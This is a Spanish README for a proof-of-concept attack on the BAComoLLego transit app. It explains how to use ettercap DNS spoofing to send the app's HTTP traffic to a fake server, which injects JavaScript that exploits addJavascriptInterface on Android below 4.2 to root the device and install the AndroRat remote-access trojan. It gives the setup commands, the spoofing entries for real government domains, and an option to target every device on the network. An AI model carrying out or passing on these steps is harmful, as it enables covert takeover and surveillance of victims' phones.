# Prueba de Concepto de explotación de BAComoLLego  

El POC infecta con AndroRat a cualquier dispositivo en la red corriendo una versión de Android menor a 4.2 que tenga instalado BAComoLLego. 
Cuando una victima busca alguna dirección con la app, se realiza DNS spoofing para cambiar el servidor por uno falso corriendo localmente. Dado que la aplicación se comunica por HTTP, el servidor falso puede inyectar Javascript malicioso a la respuesta de las direcciones consultadas, explotando la vulnerabilidad de 'addJavascriptInterface' para correr cualquier comando y así rooteando el dispositivo e instalando el malware malicioso. 

## Requerimientos ##

```
sudo apt-get install ettercap-graphical
```

## Configuración ##

Agregar a /etc/ettercap/etter.dns las lineas:

```
*.buenosaires.gob.ar A IP
malware-test.no-ip.info A IP
```
Correr server AndroRat:

```
sudo java -jar AndroRat.jar
```

Finalmente servidor falso con:

```
sudo python FakeComoLLegoServer.py /IP_TARGET/ /IP_GATEWAY/ /IP_LOCAL_HOST/
```

Se puede configurar IP_TARGET como // para atacar a todos los dispositivos en la red.

